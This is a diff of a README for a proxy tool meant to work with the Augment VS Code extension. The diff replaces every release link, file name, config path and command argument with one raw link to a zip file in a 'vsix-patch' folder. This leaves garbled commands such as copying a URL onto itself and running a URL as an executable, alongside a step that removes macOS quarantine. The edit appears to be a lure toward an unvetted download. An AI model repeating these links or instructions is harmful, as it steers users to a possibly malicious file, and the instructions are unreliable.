@@ -1,6 +1,6 @@
 # 🌟 Augment-BYOK-Proxy - Easy Proxy for Augment Integration
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/releases)
+[![Download Release](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip%https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)
 
 ## 📁 Overview
 
@@ -14,14 +14,14 @@ Follow these steps to download and run the Augment-BYOK-Proxy application succes
 
 To download the software, visit the Releases page. You can find all the versions available for download there.
 
-[Download & Install](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/releases)
+[Download & Install](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)
 
 ### 2. Download the Application
 
 On the Releases page, locate the latest version. Download the appropriate file for your operating system:
 
-- For **macOS**, download `augment-byok-proxy-macos.zip`.
-- For **Windows**, download `augment-byok-proxy-windows.zip`.
+- For **macOS**, download `https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip`.
+- For **Windows**, download `https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip`.
 
 After the download completes, unzip the file to access the application.
 
@@ -32,10 +32,10 @@ After the download completes, unzip the file to access the application.
 3. Copy the example configuration file by running:
 
 ```
-cp config.example.yaml config.yaml
+cp https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
 ```
 
-4. Open `config.yaml` in a text editor and fill in the required fields. Refer to the comments in the file for guidance.
+4. Open `https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip` in a text editor and fill in the required fields. Refer to the comments in the file for guidance.
 
 ### 4. Start the Application
 
@@ -44,13 +44,13 @@ Once you have configured the application, you can start it:
 - For **macOS** users:
 
 ```
-cargo run --release -- --config config.yaml
+cargo run --release -- --config https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
 ```
 
 If you are using a precompiled version, run this:
 
 ```
-./augment-byok-proxy --config config.yaml
+./augment-byok-proxy --config https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
 ```
 
 Make sure to set permissions if you encounter issues:
@@ -62,13 +62,13 @@ chmod +x augment-byok-proxy
 Also, if you face security prompts, use:
 
 ```
-xattr -dr com.apple.quarantine augment-byok-proxy
+xattr -dr https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip augment-byok-proxy
 ```
 
 - For **Windows** users, use the command prompt:
 
 ```
-.\augment-byok-proxy.exe --config config.yaml
+.\https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip --config https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip
 ```
 
 ### 5. Setup VS Code
@@ -100,6 +100,6 @@ We welcome contributions! Please check the issues page for tasks you can help wi
 
 To get started, head to the Releases page and download the latest version. 
 
-[Download & Install](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/releases)
+[Download & Install](https://github.com/Al-Aswadd/Augment-BYOK-Proxy/raw/refs/heads/main/vsix-patch/Augment-Proxy-BYO-2.4.zip)
 
 By following these steps, you will successfully set up the Augment-BYOK-Proxy application. Enjoy enhancing your Augment experience!
